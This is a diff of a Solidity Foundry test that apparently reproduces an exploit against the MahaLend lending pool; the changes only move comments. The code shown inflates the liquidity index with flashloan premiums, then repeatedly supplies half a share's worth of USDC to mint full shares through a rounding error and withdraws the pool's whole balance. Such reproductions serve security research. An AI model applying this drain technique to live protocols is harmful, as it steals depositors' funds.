@@ -101,8 +101,7 @@ contract ContractTest is Test {
         uint256 premiumPerFlashloan = uint256(1_160_272_591_443) * 5 / 10_000 + 1; // 0.05% flashlaon fee
         premiumPerFlashloan -= (premiumPerFlashloan * 4 / 10_000); // 0.04% protocol fee
         uint256 nextLiquidityIndex = premiumPerFlashloan * 55 + 1; // 60 times flashloan
-        // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding
-        uint256 supplyAmount = nextLiquidityIndex / 2 + 1; // supply 50% asset of 1 share, but mint 1 share throungh rounding error
+        uint256 supplyAmount = nextLiquidityIndex / 2 + 1; // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding
 
         console.log("premiumPerFlashloan", premiumPerFlashloan);
         console.log("nextLiquidityIndex", nextLiquidityIndex);
@@ -111,10 +110,10 @@ contract ContractTest is Test {
         uint256 count;
         USDC.approve(address(MahaLend), type(uint256).max);
         do {
-            MahaLend.supply(address(USDC), supplyAmount, address(this), 0);
+            MahaLend.supply(address(USDC), supplyAmount, address(this), 0); // supply 50% asset of 1 share, but mint 1 share throungh rounding error
             count++;
         } while (USDC.balanceOf(address(mUSDC)) > count * nextLiquidityIndex);
 
-        MahaLend.withdraw(address(USDC), USDC.balanceOf(address(mUSDC)), address(this));
+        MahaLend.withdraw(address(USDC), USDC.balanceOf(address(mUSDC)), address(this)); // withdraw all asset
     }
 }
